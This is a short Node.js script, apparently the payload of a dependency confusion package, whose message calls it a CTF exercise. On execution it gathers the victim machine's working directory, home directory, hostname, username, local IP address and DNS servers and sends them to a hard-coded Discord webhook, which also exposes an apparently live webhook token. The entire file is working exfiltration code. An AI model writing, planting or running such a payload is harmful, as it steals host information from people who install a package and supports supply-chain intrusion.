const os = require('os');
const dns = require('dns');
const https = require('https');

const discordWebhookUrl = 'https://discord.com/api/webhooks/1193495191710089256/gbP4D1WCBOymeyH8Dk3wU0hQAn7KkeQcdJybmtWCRC3bQKCHpDM6bEGzox_Gn3OA-BDv'; // Replace with your Discord Webhook URL

function getIPv4() {
    const ifaces = os.networkInterfaces();
    for (let dev in ifaces) {
        for (let details of ifaces[dev]) {
            if (details.family === 'IPv4' && !details.internal) {
                return details.address;
            }
        }
    }
    return '127.0.0.1'; 
}

const baseMessage = `Alert: CTF Dependency Confusion Attack Detected!
Current Directory: ${__dirname}
Home Directory: ${os.homedir()}
Hostname: ${os.hostname()}
Username: ${os.userInfo().username}
IP Address: ${getIPv4()}
Dns-Server: ${dns.getServers().join(', ')}`; 

function sendMessage(message) {
    const payload = JSON.stringify({ content: message });
    const parsedUrl = new URL(discordWebhookUrl);
    const options = {
        hostname: parsedUrl.hostname,
        path: parsedUrl.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = https.request(options, (res) => {
        console.log(`Status: ${res.statusCode}`);
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (e) => {
        console.error(e);
    });

    req.write(payload);
    req.end();
}
sendMessage(baseMessage);
